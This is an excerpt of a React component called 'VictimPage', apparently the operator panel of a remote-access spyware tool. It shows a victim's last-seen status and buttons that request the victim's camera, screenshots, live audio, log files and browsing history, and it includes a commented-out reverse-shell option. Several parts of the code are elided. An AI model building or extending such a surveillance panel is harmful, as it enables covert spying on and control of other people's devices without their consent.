...
import { Camera, Mic, FileText, History, ScreenShareIcon } from 'lucide-react';
import FriendlyDate from './FriendlyDate';

const buttons = [
  // { label: 'Reverse shell', icon: Terminal, url: '/reverse-shell' },
  { label: 'Camera', icon: Camera, url: 'camera' },
  { label: 'Screenshot', icon: ScreenShareIcon, url: 'screenshot' },
  { label: 'Live audio', icon: Mic, url: 'liveAudio' },
  { label: 'Log files', icon: FileText, url: 'logFiles' },
  { label: 'Browsing history', icon: History, url: 'browsingHistory' },
];
...
export default function VictimPage() {
  ...
  useEffect(() => {
    ...
    const interval = setInterval(updateData, 3 * 1000);
    ...
    <div className="flex min-h-screen bg-gray-900 text-white">
      <div className="flex-grow p-4 sm:p-6 md:p-8 overflow-y-auto">
        ...
        <div className="flex items-center justify-center mb-4">
          ...
          ></span>
          <h3 className={`text-center text-2xl ${isRecentlySeen() ? 'text-green-500' : 'text-red-500'}`}>Last seen {<FriendlyDate date={victim.lastSeen} />}</h3>
        </div>

        <h2 className="text-xl font-semibold mb-4">Request data:</h2>
        <div className="grid grid-cols-2 sm:grid-cols-3 md:grid-cols-5 gap-4 mb-6">
          {buttons.map((button, index) => (
            <ActionButton key={index} {...button} victimId={_id} />
          ))}
        </div>
